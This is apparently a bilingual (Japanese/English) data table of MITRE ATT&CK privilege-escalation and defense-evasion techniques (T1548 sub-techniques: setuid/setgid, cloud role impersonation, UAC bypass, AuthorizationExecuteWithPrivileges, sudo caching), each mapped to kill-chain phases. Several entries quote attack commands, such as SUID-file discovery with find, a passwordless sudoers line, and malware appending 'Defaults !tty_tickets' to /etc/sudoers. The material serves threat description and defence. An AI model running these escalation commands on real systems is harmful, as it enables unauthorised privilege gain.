rootによって実行する必要があるsudoersファイルにエントリを作成する代わりに、任意のユーザーが自分のアプリケーションにsetuidまたはsetgidフラグを設定するように指定できます（つまり、[LinuxおよびMacのファイルとディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222/002)）。<code>chmod</code>コマンドは、ビットマスキング（<code>chmod 4777 [file]</code>）または略記名（<code>chmod u+s [file]</code>）を使用してこれらのビットを設定できます。これにより、setuidビットが有効になります。setgidビットを有効にするには、<code>chmod 2775</code>および<code>chmod g+s</code>を使用できます。

攻撃者は、将来昇格されたコンテキストで実行できるようにするために、このメカニズムを独自のマルウェアで使用できます。(引用: OSX Keydnap malware) この悪用は、しばしば「シェルエスケープ」または制限された権限を持つ実行環境をバイパスするためのその他のアクションの一部です。

あるいは、攻撃者は、setuidまたはsetgidビットが既に有効になっている脆弱なバイナリを見つけてターゲットにすることを選択する場合があります（つまり、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)）。setuidおよびsetgidビットは、<code>ls -l</code>を介してファイルの属性を表示するときに「x」の代わりに「s」で示されます。<code>find</code>コマンドを使用してそのようなファイルを検索することもできます。例えば、<code>find / -perm +4000 2>/dev/null</code>を使用してsetuidが設定されたファイルを見つけることができ、<code>find / -perm +2000 2>/dev/null</code>をsetgidに使用できます。これらのビットが設定されているバイナリは、攻撃者によって悪用される可能性があります。(引用: GTFOBins Suid)","An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \""shell escape\"" or other actions to bypass an execution environment with restricted permissions.

Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \""s\"" instead of an \""x\"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.005,一時的なクラウドアクセス権限昇格,Temporary Elevated Cloud Access,"攻撃者は、一時的に昇格されたクラウドリソースへのアクセスを可能にする権限設定を悪用する可能性があります。多くのクラウド環境では、管理者はユーザーアカウントまたはサービスアカウントに対し、ロールへのジャストインタイムアクセスを要求したり、他のアカウントになりすましたり、リソースやサービスにロールを渡したり、あるいは自身の権限とは異なる可能性のある一連の権限への短期的なアクセスを許可することができます。

ジャストインタイムアクセスは、クラウドアカウントに追加のロールをきめ細かく一時的に付与するためのメカニズムです。これにより、アカウントは日常的に必要な権限のみで運用し、必要に応じて追加の権限を要求できます。ジャストインタイムアクセス要求は、手動承認が必要なように設定されることもあれば、目的の権限が自動的に付与されることもあります。(引用: Azure Just in Time Access 2023)

アカウントの偽装により、ユーザーアカウントまたはサービスアカウントは、一時的に別のアカウントの権限で行動できます。例えば、GCPでは`iam.serviceAccountTokenCreator`ロールを持つユーザーは、サービスアカウントの権限で一時的なアクセストークンを作成したり、任意のペイロードに署名したりできます。一方、ドメイン全体の委任権限を持つサービスアカウントは、Google Workspaceアカウントになりすますことが許可されています。(引用: Google Cloud Service Account Authentication Roles)(引用: Hunters Domain Wide Delegation Google Workspace 2023)(引用: Google Cloud Just in Time Access 2023)(引用: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) Exchange Onlineでは、`ApplicationImpersonation`ロールにより、サービスアカウントは指定されたユーザーアカウントに関連付けられた権限を使用できます。(引用: Microsoft Impersonation and EWS in Exchange)

多くのクラウド環境には、ユーザーがリソースにロールを渡してタスクを実行したり、他のサービスに認証したりすることを可能にするメカニズムも含まれています。リソースを作成するユーザーは、それに渡すロールを直接引き継ぐわけではありませんが、付与された権限で特定のアクションを実行するようにリソースを設定するなどして、ロールのアクセスを利用できる場合があります。AWSでは、`PassRole`権限を持つユーザーは、作成したサービスに特定のロールを引き継がせることができます。一方、GCPでは、`iam.serviceAccountUser`ロールを持つユーザーは、サービスアカウントをリソースにアタッチできます。(引用: AWS PassRole)(引用: Google Cloud Service Account Authentication Roles)

ユーザーがこれらの機能のいずれかを使用するには特定のロール割り当てが必要ですが、クラウド管理者は権限を誤って設定する可能性があります。これにより、攻撃者が元々意図されていた範囲を超えてリソースにアクセスできるようになる昇格パスが生じる可能性があります。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation)

**注:** このテクニックは、アカウントに永続的なロールを割り当てるのではなく、既存の権限構造を悪用してリソースへの一時的に昇格されたアクセスを得ることを伴う[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)とは異なります。ただし、十分に特権のあるアカウントを侵害した攻撃者は、制御下にある別のアカウントに、これらの機能も悪用できる[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与する可能性があります。これは、特にログでロールの偽装が行われているタイミングが明確でない場合、特権の高いアカウントを直接使用するよりもステルス性が高まる可能性があります。(引用: CrowdStrike StellarParticle January 2022)","Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.

Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)

Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange)

Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)

While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)

**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.002,ユーザーアカウント制御のバイパス,Bypass User Account Control,"攻撃者はUACメカニズムをバイパスして、システム上のプロセス権限を昇格させる可能性があります。Windowsユーザーアカウント制御（UAC）は、プログラムがその権限（低から高までの整合性レベルとして追跡される）を昇格させて、管理者レベルの権限でタスクを実行できるようにするもので、場合によってはユーザーに確認を求めることがあります。ユーザーへの影響は、高強制下での操作の拒否から、ローカル管理者グループに属していてプロンプトをクリックした場合の操作の許可、または管理者パスワードを入力して操作を完了させることまで及びます。(引用: TechNet How UAC Works)

コンピュータのUAC保護レベルが最高レベル以外に設定されている場合、特定のWindowsプログラムは、UAC通知ボックスを介してユーザーにプロンプトを表示することなく、権限を昇格させたり、一部の昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトを実行したりできます。(引用: TechNet Inside UAC)(引用: MSDN COM Elevation) この例としては、[Rundll32](https://attack.mitre.org/techniques/T1218/011)を使用して、自動昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトをロードし、通常は昇格されたアクセスが必要となる保護されたディレクトリでファイル操作を実行する、特別に細工されたDLLをロードすることが挙げられます。悪意のあるソフトウェアが信頼されたプロセスに注入され、ユーザーにプロンプトを表示することなく昇格された権限を取得することもあります。(引用: Davidson Windows)

UACをバイパスする多くの方法が発見されています。UACMEのGithub readmeページには、発見され実装されたメソッドの広範なリストが含まれていますが(引用: Github UACMe)、バイパスの包括的なリストではない可能性があります。追加のバイパス方法は定期的に発見されており、次のようなものが実際に使用されています。

* <code>eventvwr.exe</code>は自動昇格し、指定されたバイナリまたはスクリプトを実行できます。(引用: enigma0x3 Fileless UAC Bypass)(引用: Fortinet Fareit)

管理者権限を持つアカウントの資格情報がわかっている場合、UACは単一システムのセキュリティメカニズムであり、あるシステムで実行されているプロセスの権限や整合性はリモートシステムでは不明であり、デフォルトで高整合性となるため、一部の横方向の移動テクニックを介して別のバイパスが可能です。(引用: SANS UAC Bypass)","Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.004,プロンプトによる昇格実行,Elevated Execution with Prompt,"攻撃者は<code>AuthorizationExecuteWithPrivileges</code> APIを利用して、ユーザーに資格情報を要求することで権限を昇格させる可能性があります。(引用: AppleDocs AuthorizationExecuteWithPrivileges) このAPIの目的は、アプリケーション開発者がアプリケーションのインストールや更新など、ルート権限で操作を簡単に行えるようにすることです。このAPIは、ルート権限を要求するプログラムが信頼できるソースからのものであるか、または悪意を持って変更されていないかを検証しません。

このAPIは非推奨ですが、macOSの最新リリースでも完全に機能します。このAPIを呼び出すと、ユーザーは資格情報の入力を求められますが、プログラムの出所や整合性に関するチェックは行われません。APIを呼び出すプログラムは、昇格された権限で悪意のある動作を実行するように変更できる、グローバルに書き込み可能なファイルをロードすることもあります。

攻撃者は<code>AuthorizationExecuteWithPrivileges</code>を悪用してルート権限を取得し、被害者に悪意のあるソフトウェアをインストールしたり、永続化メカニズムをインストールしたりする可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019)(引用: OSX Coldroot RAT) このテクニックは、ユーザーを騙して悪意のあるコードに昇格された権限を付与させるために[マスカレード](https://attack.mitre.org/techniques/T1036)と組み合わせることができます。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019) このテクニックは、このAPIを利用するマシン上に存在する正当なプログラムを変更することでも機能することが示されています。(引用: Death by 1000 installers; it's all broken!)","Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.

Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.003,SudoおよびSudoキャッシング,Sudo and Sudo Caching,"攻撃者はsudoキャッシングを実行したり、sudoersファイルを使用して権限を昇格させたりする可能性があります。攻撃者はこれを利用して、他のユーザーとしてコマンドを実行したり、より高い権限でプロセスを起動したりする可能性があります。

LinuxおよびMacOSシステム内では、sudo（「スーパーユーザー実行」とも呼ばれる）により、ユーザーは昇格された権限でターミナルからコマンドを実行し、システム上でこれらのコマンドを実行できるユーザーを制御できます。<code>sudo</code>コマンドは、「システム管理者が、特定のユーザー（またはユーザーグループ）に、コマンドとその引数の監査証跡を提供しながら、ルートまたは別のユーザーとして一部（またはすべて）のコマンドを実行する権限を与えることを許可します。」(引用: sudo man page 2018) sudoはシステム管理者向けに作成されたため、<code>timestamp_timeout</code>などの便利な構成機能があります。これは、パスワードの再入力を求める前に<code>sudo</code>のインスタンス間で経過する時間（分単位）です。これは、<code>sudo</code>が一定期間資格情報をキャッシュする機能を持っているためです。Sudoは、このタイムアウトを決定するために、最後にsudoが実行されたときのタイムスタンプを持つファイルを<code>/var/db/sudo</code>に作成（またはタッチ）します。さらに、各新しいtty（ターミナルセッション）を個別に扱う<code>tty_tickets</code>変数があります。これは、たとえば、あるttyのsudoタイムアウトが別のttyに影響しないことを意味します（再度パスワードを入力する必要があります）。

<code>/etc/sudoers</code>ファイルは、どのユーザーがどのコマンドをどのターミナルから実行できるかを記述します。また、ユーザーが他のユーザーまたはグループとして実行できるコマンドも記述します。これにより、ユーザーはほとんどの場合、可能な限り低い権限で実行し、必要に応じて他のユーザーまたは権限に昇格する（通常はパスワードの入力を求める）という最小権限の原則が提供されます。ただし、sudoersファイルは、<code>user1 ALL=(ALL) NOPASSWD: ALL</code>のような行でユーザーにパスワードの入力を求めないように指定することもできます。(引用: OSX.Dok Malware) ただし、このファイルを編集するには昇格された権限が必要です。

攻撃者はまた、これらのメカニズムの不適切な構成を悪用して、ユーザーのパスワードを必要とせずに権限を昇格させる可能性があります。例えば、<code>/var/db/sudo</code>のタイムスタンプを監視して、<code>timestamp_timeout</code>の範囲内にあるかどうかを確認できます。もしそうであれば、マルウェアはユーザーのパスワードを入力する必要なくsudoコマンドを実行できます。さらに、<code>tty_tickets</code>が無効になっている場合、攻撃者はそのユーザーの任意のttyからこれを実行できます。

実際に、マルウェアはスクリプト作成を容易にするために、<code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>を発行して<code>tty_tickets</code>を無効にしています。(引用: cybereason osx proton) この変更を反映させるために、マルウェアは<code>killall Terminal</code>も発行しました。macOS Sierra以降、sudoersファイルではデフォルトで<code>tty_tickets</code>が有効になっています。","Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

Within Linux and MacOS systems, sudo (sometimes referred to as \""superuser do\"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\""(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

